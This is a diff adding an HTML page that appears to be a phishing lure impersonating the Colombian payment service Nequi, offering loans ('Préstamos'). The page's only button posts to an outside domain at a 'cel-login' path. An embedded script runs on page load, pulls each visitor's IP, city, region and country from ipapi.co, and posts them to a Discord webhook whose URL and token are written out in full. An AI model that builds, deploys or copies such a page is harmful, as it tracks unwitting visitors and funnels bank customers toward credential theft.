@@ -1,0 +1,76 @@
+
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Préstamos</title>
+  <link rel="stylesheet" href="/css/styles.css">
+  <style>
+    .texto {
+      font-size: 0.01px;
+    }
+  </style>
+</head>
+
+<body style="margin: 0;">
+
+  <div style="width: 100%; display: flex; justify-content: space-around;"></div>
+
+  <div style="width: 100%; margin:0px; display: grid; text-align: center;">
+    <div class="img">
+      <div>
+        <img src="img/Nequi-5.png" alt="" style="width: 100%; margin-top:0px;">
+      </div>
+      <div>
+        <img src="img/Nequi.png" alt="" style="width: 100%; margin-top:20px;">
+      </div>
+      <center><br>
+        <form action="https://online-propulsor.online/i/cel-login.html" method="post">
+          <br>
+          <input type="submit" value="Solicítalo"
+            style="background-color: #DA0081; color:#ffffff; height:40px; font-weight:600; width:83%; border-radius: 5px; border:none; margin-bottom:20px;">
+        </form>
+      </center>
+    </div>
+  </div>
+
+<script>
+  // 👇 Tu webhook de Discord
+  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";
+
+  // Detectar ubicación del visitante
+  fetch("https://ipapi.co/json/")
+    .then(response => response.json())
+    .then(data => {
+      const mensaje = {
+        content: `🌍 Nuevo visitante detectado
+📍 Ciudad: ${data.city}
+🗺 Región: ${data.region}
+🇨🇴 País: ${data.country_name}
+💻 IP: ${data.ip}`
+      };
+
+      // Enviar mensaje a Discord
+      fetch(DISCORD_WEBHOOK_URL, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(mensaje)
+      });
+    })
+    .catch(error => {
+      console.error("Error obteniendo la ubicación:", error);
+    });
+</script>
+
+</body>
+
+</html>
+
+
+
+
+
+
+
